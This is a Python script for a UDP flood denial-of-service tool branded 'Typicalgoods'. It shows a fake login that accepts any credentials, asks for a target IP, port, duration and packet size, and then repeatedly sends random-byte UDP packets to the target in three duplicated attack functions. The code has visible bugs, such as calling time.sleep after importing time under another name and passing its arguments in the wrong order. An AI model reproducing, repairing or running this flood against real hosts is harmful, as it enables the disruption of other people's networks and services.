from time import time as tt
import argparse, socket, random, os
from sys import stdout
os.system("clear")

print("""\033[91m
\033[91m╔╦╗╦ ╦╔═╗╦╔═╗╔═╗╦  ╔═╗╔═╗╔═╗╔╦╗╔═╗
\033[91m ║ ╚╦╝╠═╝║║  ╠═╣║  ║ ╦║ ║║ ║ ║║╚═╗
\033[91m ╩  ╩ ╩  ╩╚═╝╩ ╩╩═╝╚═╝╚═╝╚═╝═╩╝╚═╝
""")

username = str(input("\033[93mUsername:"))
password = str(input("\033[93mPassword:"))
if password == f"{password}" and username == f"{username}":
    print (f"Connect As {username}")
    time.sleep(2)

else:
    print (f"The password you entered is wrong Password You Input: {password}")
    exit()

os.system("clear")
print("""\033[91m
\033[91m╔╦╗╦ ╦╔═╗╦╔═╗╔═╗╦  ╔═╗╔═╗╔═╗╔╦╗╔═╗
\033[91m ║ ╚╦╝╠═╝║║  ╠═╣║  ║ ╦║ ║║ ║ ║║╚═╗
\033[91m ╩  ╩ ╩  ╩╚═╝╩ ╩╩═╝╚═╝╚═╝╚═╝═╩╝╚═╝
""")

print("\033[95mIP HOST")
ip = str(input("╚══> "))
time.sleep(2)
print("\033[95mPORT HOST")
port = int(input("╚══> "))
time.sleep(2)
print("\033[95mPACKET INPUT")
time = int(input("╚══> "))
time.sleep(2)
print("\033[95mTHREADS INPUT")
threads = int(input("╚══>"))

os.system("clear")

attacks = """
\033[95m╔╦╗╦ ╦╔═╗╦╔═╗╔═╗╦  ╔═╗╔═╗╔═╗╔╦╗╔═╗
\033[95m ║ ╚╦╝╠═╝║║  ╠═╣║  ║ ╦║ ║║ ║ ║║╚═╗
\033[95m ╩  ╩ ╩  ╩╚═╝╩ ╩╩═╝╚═╝╚═╝╚═╝═╩╝╚═╝
\033[91m╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═
\033[91m╠═╣ ║  ║ ╠═╣║  ╠╩╗
\033[91m╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩
"""

def attack(ip, port, threads, time):
    if time is None:
        time = float('inf')
    if port is not None:
        port = max(1, min(65535, port))
        print(attacks)
        print("\033[92m TYPICALGOODS.")
        fmt = '\033[91m  Typicalgoods Sent Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)
    startup = tt()
    threads = os.urandom(min(666,1024,1021,102400,4096,20000, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        port = port or random.randint(1, 65535)
        endtime = tt()
        if startup + time < endtime:
            break
        sock.sendto(threads, (ip, port))

    print ('\x1b[92mAttack Finished')
    return

def attack2(ip, port, threads, time):
    if time is None:
        time = float('inf')
    if port is not None:
        port = max(1, min(65535, port))
        print(attacks)
        print("\033[92m TYPICALGOODS.")
        fmt = '\033[91m  Typicalgoods Sent Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)
    startup = tt()
    threads = os.urandom(min(666,1024,1021,102400,4096,20000, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        port = port or random.randint(1, 65535)
        endtime = tt()
        if startup + time < endtime:
            break
        sock.sendto(threads, (ip, port))

    print ('\x1b[92mAttack Finished')
    return

def attack3(ip, port, threads, time):
    if time is None:
        time = float('inf')
    if port is not None:
        port = max(1, min(65535, port))
        print(attacks)
        print("\033[92m TYPICALGOODS.")
        fmt = '\033[91m  Typicalgoods Sent Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)
    startup = tt()
    threads = os.urandom(min(666,1024,1021,102400,4096,20000, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        port = port or random.randint(1, 65535)
        endtime = tt()
        if startup + time < endtime:
            break
        sock.sendto(threads, (ip, port))

    print ('\x1b[92mAttack Finished')
    return

if __name__ == '__main__':
    try:
        attack(ip, port, time, threads)
        attack2(ip, port, time, threads)
        attack3(ip, port, time, threads)
    except KeyboardInterrupt:
        print ('Attack stopped.')
